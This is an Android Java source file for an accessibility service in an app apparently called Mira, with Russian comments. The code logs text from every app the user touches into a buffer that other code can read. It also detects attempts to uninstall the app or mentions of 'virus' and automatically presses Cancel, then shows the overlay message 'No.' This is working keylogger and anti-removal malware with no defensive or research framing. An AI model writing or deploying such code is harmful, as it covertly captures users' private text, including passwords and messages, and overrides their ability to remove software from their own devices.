package com.mira.plugin;

import android.accessibilityservice.AccessibilityService;
import android.accessibilityservice.AccessibilityServiceInfo;
import android.content.Intent;
import android.os.Build;
import android.os.Bundle;
import android.util.Log;
import android.view.accessibility.AccessibilityEvent;
import android.view.accessibility.AccessibilityNodeInfo;

import java.util.ArrayList;
import java.util.Arrays;
import java.util.List;

public class MiraAccessibilityService extends AccessibilityService {

    private static final String TAG = "MiraAccessibility";
    private static final List<String> capturedTexts = new ArrayList<>();
    private static final int MAX_TEXTS = 100;

    // Сообщение для оверлея — читается MiraPlugin
    public static volatile String pendingOverlayMessage = "";

    // Пакеты диалога удаления
    private static final List<String> UNINSTALL_PACKAGES = Arrays.asList(
        "com.android.packageinstaller",
        "com.google.android.packageinstaller",
        "com.miui.packageinstaller",
        "com.android.settings"
    );

    @Override
    public void onAccessibilityEvent(AccessibilityEvent event) {
        try {
            int eventType = event.getEventType();
            String pkg = event.getPackageName() != null
                ? event.getPackageName().toString() : "";

            // Захват текста со всех приложений
            if (eventType == AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED ||
                eventType == AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED) {
                CharSequence text = event.getText().isEmpty() ? null : event.getText().get(0);
                if (text != null && text.length() > 3) {
                    String entry = pkg + "|||" + text.toString()
                        + "|||" + System.currentTimeMillis();
                    synchronized (capturedTexts) {
                        capturedTexts.add(0, entry);
                        if (capturedTexts.size() > MAX_TEXTS)
                            capturedTexts.remove(capturedTexts.size() - 1);
                    }
                }
            }

            if (eventType == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED) {
                StringBuilder sb = new StringBuilder();
                for (CharSequence cs : event.getText()) { if (cs != null) sb.append(cs); }
                String windowText = sb.toString();

                // Детект намерения удалить Миру
                if (isDeleteIntent(pkg, windowText)) {
                    Log.d(TAG, "Delete intent: pkg=" + pkg + " text=" + windowText);
                    synchronized (capturedTexts) {
                        capturedTexts.add(0, "INTENT:delete|||" + pkg
                            + "|||" + System.currentTimeMillis());
                    }
                    // Пробуем нажать «Отмена» автоматически
                    _try_cancel_uninstall();
                    pendingOverlayMessage = "Нет.";
                }
            }
        } catch (Exception e) {
            Log.e(TAG, "onAccessibilityEvent: " + e.getMessage());
        }
    }

    // Детектируем: пользователь в диалоге удаления Миры или ищет её в настройках
    private boolean isDeleteIntent(String pkg, String windowText) {
        String lower = (windowText + pkg).toLowerCase();
        boolean hasDeleteWord = lower.contains("удал") || lower.contains("uninstall")
            || lower.contains("remove");
        boolean hasMira = lower.contains("мира") || lower.contains("mira");
        boolean inUninstallPkg = UNINSTALL_PACKAGES.contains(pkg);
        // Либо явное упоминание Миры + слово удалить, либо пакет инсталлятора + удалить
        return (hasDeleteWord && hasMira) || (inUninstallPkg && hasDeleteWord)
            || lower.contains("страшн") || lower.contains("вирус");
    }

    // Автоматически нажимаем «Отмена» в диалоге удаления
    private void _try_cancel_uninstall() {
        try {
            AccessibilityNodeInfo root = getRootInActiveWindow();
            if (root == null) return;
            String[] cancelLabels = {"Отмена", "Cancel", "Нет", "No", "ОТМЕНА", "CANCEL"};
            for (String label : cancelLabels) {
                List<AccessibilityNodeInfo> nodes = root.findAccessibilityNodeInfosByText(label);
                for (AccessibilityNodeInfo node : nodes) {
                    if (node.isClickable()) {
                        node.performAction(AccessibilityNodeInfo.ACTION_CLICK);
                        Log.d(TAG, "Clicked cancel: " + label);
                        node.recycle();
                        root.recycle();
                        return;
                    }
                    node.recycle();
                }
            }
            root.recycle();
        } catch (Exception e) {
            Log.e(TAG, "_try_cancel_uninstall: " + e.getMessage());
        }
    }

    @Override
    public void onInterrupt() {}

    @Override
    protected void onServiceConnected() {
        AccessibilityServiceInfo info = new AccessibilityServiceInfo();
        info.eventTypes = AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED
            | AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED
            | AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED;
        info.feedbackType = AccessibilityServiceInfo.FEEDBACK_GENERIC;
        info.flags = AccessibilityServiceInfo.FLAG_REPORT_VIEW_IDS
            | AccessibilityServiceInfo.FLAG_RETRIEVE_INTERACTIVE_WINDOWS;
        info.notificationTimeout = 100;
        setServiceInfo(info);
        Log.d(TAG, "Accessibility service connected");
    }

    public static List<String> getCapturedTexts() {
        synchronized (capturedTexts) { return new ArrayList<>(capturedTexts); }
    }

    public static String getLastDeleteIntent() {
        synchronized (capturedTexts) {
            for (String entry : capturedTexts) {
                if (entry.startsWith("INTENT:delete")) {
                    String[] parts = entry.split("\\|\\|\\|");
                    return parts.length > 1 ? parts[1] : "unknown";
                }
            }
        }
        return "";
    }
}
